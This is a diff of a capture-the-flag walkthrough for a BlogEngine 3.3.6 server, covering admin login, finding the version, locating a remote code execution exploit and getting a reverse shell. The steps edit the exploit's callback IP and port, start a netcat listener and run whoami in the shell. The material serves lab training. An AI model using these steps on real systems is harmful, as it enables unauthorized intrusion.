@@ -28,9 +28,9 @@ login: admin   password: 1qa*****
 ### Now you have logged into the website, are you able to identify the version of the BlogEngine?
 Login to the admin panel and click About to find the version.
 ### What is the CVE?
-Search for BlogEngine 3.3.6 using Exploit-db<br>
+Search for BlogEngine 3.3.6 using [Exploit-db](https://www.exploit-db.com/)<br>
 Look for a Remote Code Execution
-###Using the public exploit, gain initial access to the server.
+### Using the public exploit, gain initial access to the server.
 Download the exploit and save it as PostView.ascx.<br>
 Change System.Net.Sockets.TcpClient("10.10.10.20", 4445) to mach the IP & Port you use in NC.
 Run nc -lvnp 4445 on you attackbox<br>
@@ -41,3 +41,4 @@ Now there should be a connection to you nc.
 ### Who is the webserver running as?
 run whoami in the reverse shell console
 
+To be continued...
